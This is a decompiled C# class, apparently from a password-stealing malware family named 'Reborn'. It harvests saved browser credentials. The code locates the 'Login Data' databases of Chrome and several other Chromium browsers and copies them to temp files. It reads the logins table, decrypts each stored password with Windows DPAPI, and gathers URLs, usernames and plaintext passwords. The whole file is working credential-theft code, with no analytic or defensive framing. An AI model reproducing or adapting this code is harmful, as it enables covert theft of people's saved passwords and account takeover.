using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Reborn.Helper;

namespace Reborn.Browsers
{
	// Token: 0x02000024 RID: 36
	public class Chromium
	{
		// Token: 0x060000F1 RID: 241 RVA: 0x000097CC File Offset: 0x000079CC
		public static List<PassData> Initialise()
		{
			List<PassData> list = new List<PassData>();
			string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
			string[] array = new string[]
			{
				environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Login Data",
				environmentVariable + "\\Kometa\\User Data\\Default\\Login Data",
				environmentVariable + "\\Orbitum\\User Data\\Default\\Login Data",
				environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Login Data",
				environmentVariable + "\\Amigo\\User\\User Data\\Default\\Login Data",
				environmentVariable + "\\Torch\\User Data\\Default\\Login Data"
			};
			for (int i = 0; i < array.Length; i++)
			{
				List<PassData> list2 = Chromium.Get(array[i]);
				if (list2 != null)
				{
					list.AddRange(list2);
				}
			}
			return list;
		}

		// Token: 0x060000F2 RID: 242
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Chromium.DataBlob pCipherText, ref string pszDescription, ref Chromium.DataBlob pEntropy, IntPtr pReserved, ref Chromium.CryptprotectPromptstruct pPrompt, int dwFlags, ref Chromium.DataBlob pPlainText);

		// Token: 0x060000F3 RID: 243 RVA: 0x00009890 File Offset: 0x00007A90
		public static byte[] DecryptChromium(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			Chromium.DataBlob dataBlob = default(Chromium.DataBlob);
			Chromium.DataBlob dataBlob2 = default(Chromium.DataBlob);
			Chromium.DataBlob dataBlob3 = default(Chromium.DataBlob);
			Chromium.CryptprotectPromptstruct cryptprotectPromptstruct = new Chromium.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(Chromium.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (cipherTextBytes == null)
					{
						cipherTextBytes = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					dataBlob2.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
				}
				catch (Exception)
				{
				}
				try
				{
					if (entropyBytes == null)
					{
						entropyBytes = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					dataBlob3.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
				}
				catch (Exception)
				{
				}
				Chromium.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch (Exception)
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x00009A64 File Offset: 0x00007C64
		private static List<PassData> Get(string basePath)
		{
			if (!File.Exists(basePath))
			{
				return null;
			}
			string program = "";
			if (basePath.Contains("Chrome"))
			{
				program = "Google Chrome";
			}
			if (basePath.Contains("Yandex"))
			{
				program = "Yandex Browser";
			}
			if (basePath.Contains("Orbitum"))
			{
				program = "Orbitum Browser";
			}
			if (basePath.Contains("Opera"))
			{
				program = "Opera Browser";
			}
			if (basePath.Contains("Amigo"))
			{
				program = "Amigo Browser";
			}
			if (basePath.Contains("Torch"))
			{
				program = "Torch Browser";
			}
			if (basePath.Contains("Comodo"))
			{
				program = "Comodo Browser";
			}
			List<PassData> result;
			try
			{
				string text = Path.GetTempPath() + "/" + Misc.GetRandomString() + ".fv";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(basePath, text, true);
				SqlHandler sqlHandler = new SqlHandler(text);
				List<PassData> list = new List<PassData>();
				sqlHandler.ReadTable("logins");
				for (int i = 0; i < sqlHandler.GetRowCount(); i++)
				{
					try
					{
						string text2 = string.Empty;
						try
						{
							byte[] bytes = Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlHandler.GetValue(i, 5)), null);
							text2 = Encoding.UTF8.GetString(bytes);
						}
						catch (Exception)
						{
						}
						if (text2 != "")
						{
							list.Add(new PassData
							{
								Url = sqlHandler.GetValue(i, 1).Replace("https://", "").Replace("http://", ""),
								Login = sqlHandler.GetValue(i, 3),
								Password = text2,
								Program = program
							});
						}
					}
					catch (Exception arg_19F_0)
					{
						Console.WriteLine(arg_19F_0.ToString());
					}
				}
				File.Delete(text);
				result = list;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x02000025 RID: 37
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x0400006D RID: 109
			public int cbSize;

			// Token: 0x0400006E RID: 110
			public int dwPromptFlags;

			// Token: 0x0400006F RID: 111
			public IntPtr hwndApp;

			// Token: 0x04000070 RID: 112
			public string szPrompt;
		}

		// Token: 0x02000026 RID: 38
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x04000071 RID: 113
			public int cbData;

			// Token: 0x04000072 RID: 114
			public IntPtr pbData;
		}
	}
}
